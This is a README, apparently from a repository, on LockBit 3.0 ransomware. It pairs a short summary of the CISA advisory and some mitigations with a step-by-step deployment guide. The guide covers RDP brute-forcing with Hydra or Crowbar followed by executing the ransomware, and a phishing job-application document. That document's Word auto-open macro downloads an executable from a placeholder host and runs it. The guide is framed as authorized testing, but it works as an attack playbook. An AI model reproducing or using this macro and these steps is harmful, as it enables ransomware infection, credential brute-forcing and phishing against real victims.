# LockBit
LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.

## Initial Access
Anyone deploying LockBit 3.0 ransomware gains initial access to victim networks via remote desktop protocol (RDP) exploitation, drive-by compromise, phishing campaigns, abuse of valid accounts, and exploitation of public-facing applications.

## Execution and Infiltration
During the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the required privileges. LockBit 3.0 performs functions such as:

* Enumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices
* Terminating processes and services
* Launching commands
* Enabling automatic logon for persistence and privilege escalation
* Deleting log files, files in the recycle bin folder, and shadow copies residing on disk

After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding. If needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2) server.

## Mitigations
* Have an anti-virus software separate from the built-in Windows defender installed.
* Keep all systems, software, and firmware up to date
* Disable unused ports
* Take backups and keep them safe

## Testing on Authorized Systems
To test LockBit 3.0 on a system, you must first generate the files required before accessing the system. The batch file in this repo can automate this process.

Once that has been done, there are several different methods for accessing the system and many are included in guides online. The process for a couple of methods will be listed here.

### Accessing a System with RDP
This method will not work if the target does not have RDP enabled or does not have the port forwarded on the network. Make sure this is done beforehand. Brute forcing the password also takes a significant amount of time and if the password is good enough, it may be near impossible.
1. Know the IP address of your target or obtain it with NMAP
2. Make sure the port 3389 is open on the target's network with NMAP
3. Use a brute force tool such as Crowbar or Hydra
4. Connect using a client of your choice
5. Copy the LockBit 3.0 files to the remote machine using your client, a cloud service, FTP, or any other method of your choice
6. Execute Lockbit 3.0

### Accessing a System with a Phishing Scheme
In this case, an email will be sent with a job application. When the job application is opened (using Microsoft Word) and the button to start editing it is pressed, LockBit 3.0 is downloaded and executed. There is a guide online, but here are some tips:
1. In Word, enter dev mode with `Alt+F8`
2. The macro in the guide works, but only for an executable already in the path. An easy way to copy and execute LockBit 3.0 is to download and run the executable in the macro. Here is a version of the macro that implements this:
```
Sub Document_Open()

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://example.com/LB3.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "c:\temp\LB3.exe", 2 '//overwrite
end with

CreateObject("WScript.Shell").Run "c:\temp\LB3.exe"

End Sub
```
3. Follow everything else in the guide to create the final document
4. Send an email containing the document, and when the user opens and presses "Enable Editing", it should execute LockBit 3.0

## [#StopRansomware: LockBit 3.0](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)

**This project is only for the investigation of the ransomware and how it can be mitigated. It is not to be used to attack systems without authorization.**

“#Stopransomware: LockBit 3.0: CISA.” Cybersecurity and Infrastructure Security Agency CISA, 15 Mar. 2023, https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a. 

